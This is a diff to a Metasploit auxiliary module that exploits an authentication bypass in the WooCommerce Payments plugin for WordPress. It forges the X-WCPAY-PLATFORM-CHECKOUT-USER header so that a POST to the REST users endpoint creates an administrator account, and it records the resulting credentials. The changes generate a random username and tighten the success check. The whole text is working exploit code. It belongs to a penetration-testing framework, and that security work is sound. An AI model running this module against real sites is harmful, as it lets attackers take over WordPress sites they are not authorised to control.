@@ -76,15 +76,20 @@ class MetasploitModule < Msf::Auxiliary
       email = Rex::Text.rand_mail_address
     end
 
-    print_status("Attempting to create an administrator user -> #{datastore['USERNAME']}:#{password} (#{email})")
-    [nil, 'index.php'].each do |url_root| # try through both '' and 'index.php' since API can be in 2 diff places based on install/rewrites
+    username = datastore['USERNAME']
+    if datastore['USERNAME'].blank?
+      username = Rex::Text.rand_text_alphanumeric(5..20)
+    end
+
+    print_status("Attempting to create an administrator user -> #{username}:#{password} (#{email})")
+    ['/', 'index.php'].each do |url_root| # try through both '' and 'index.php' since API can be in 2 diff places based on install/rewrites
       res = send_request_cgi({
         'uri' => normalize_uri(target_uri.path, url_root, 'wp-json', 'wp', 'v2', 'users'),
         'headers' => { "X-WCPAY-PLATFORM-CHECKOUT-USER": datastore['ADMINID'] },
         'method' => 'POST',
         'ctype' => 'application/json',
         'data' => {
-          'username' => datastore['USERNAME'],
+          'username' => username,
           'email' => email,
           'password' => password,
           'roles' => ['administrator']
@@ -93,7 +98,7 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'Connection failed') unless res
       next if res.code == 404
 
-      if res.code == 201
+      if res.code == 201 && res.body&.match(/"email":"#{email}"/) && res.body&.match(/"username":"#{username}"/)
         print_good('User was created successfully')
         if framework.db.active
           create_credential_and_login({
